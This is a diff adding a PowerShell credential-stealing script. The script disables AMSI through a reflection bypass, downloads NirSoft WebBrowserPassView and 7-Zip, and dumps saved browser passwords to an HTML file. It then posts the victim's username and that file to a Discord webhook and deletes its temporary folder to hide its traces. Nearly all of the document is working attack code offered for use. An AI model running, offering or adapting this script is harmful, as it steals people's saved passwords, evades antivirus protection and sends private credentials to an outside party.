@@ -1,0 +1,55 @@
+$desktop = ([Environment]::GetFolderPath("Desktop"))
+
+# AMSI Bypass
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
+
+function Get-WebBrowserData {
+    # Create a temporary directory and navigate into it
+    mkdir \temp 
+    cd \temp
+
+    # Download the Nirsoft WebBrowserPassView tool
+    Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
+
+    # Download 7-Zip command line utility to extract the Nirsoft tool
+    Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
+    Expand-Archive 7z.zip 
+
+    # Extract the WebBrowserPassView tool
+    .\7z\7za.exe e wbpv.zip
+
+    # Run WebBrowserPassView and save the results to a text file
+    .\WebBrowserPassView.exe /shtml web_data.html
+}
+
+function Upload-Discord {
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$True)]
+        [string]$file
+    )
+
+    $Body = @{
+        'username' = $env:username
+        'content' = "Browser data collected:"
+    }
+
+    # Post a message about the data collection
+    Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
+
+    # Upload the file containing browser data
+    if (-not ([string]::IsNullOrEmpty($file))){
+        curl.exe -F "file1=@$file" $DiscordUrl
+    }
+}
+
+function Clean-Up {
+    # Delete temporary files and directories
+    cd C:\
+    rmdir -R \temp
+}
+
+# Main execution
+Get-WebBrowserData
+Upload-Discord -file "\temp\web_data.html"
+Clean-Up
